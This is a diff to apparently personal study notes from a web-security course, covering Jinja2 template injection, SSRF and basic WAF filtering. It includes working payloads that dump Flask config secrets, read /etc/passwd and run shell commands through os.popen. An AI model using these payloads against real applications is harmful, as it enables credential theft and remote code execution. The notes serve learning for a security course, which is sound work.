@@ -62,6 +62,7 @@
     - Check for the vuln: `{{7*6}}`
     - Output Flask config (often includes DB credentials or session secret keys): `{{config}}`
     - Read file: `{{'abc'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()}}`
+      - You may have to mess with the indices a bit, e.g. on my Mac you want `111` instead of `92`.
     - Use code from a module (this example is also RCE): `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
   - TBH stole MRO example and most of these payloads from https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
 - Server Side Request Forgery (SSRF)
@@ -69,3 +70,11 @@
   - e.g. A website where you can upload an image by giving it a URL rather than actually uploading a file.
     - The website will (typically) download the file from the URL, so it must send a request to it, which may give you more information (especially if it's something more interesting than an image upload).
   - Maybe your URL gets info attached to it, e.g. the server sends a request to `http://yoursite.com/<insert_data_here>` or to `http://<insert_data_here>.yoursite.com`.
+- Reverse Proxies/WAFs
+  - Most WAFs you have to deal with in this course are very basic.
+    - Mostly looking for characters or character combinations e.g. `;` and `--`.
+    - Anything more complicated you'll usually get source code because it's otherwise just trial and error.
+    - But don't trust this too much because idk what Andrew and Lachlan may have cooked up.
+  - Real-world WAFs are a pain especially from large providers like Cloudflare, since you'll get banned from all the sites they proxy.
+    - No way to see exactly what caused a block.
+    - No way to know how many requests will get you banned.s
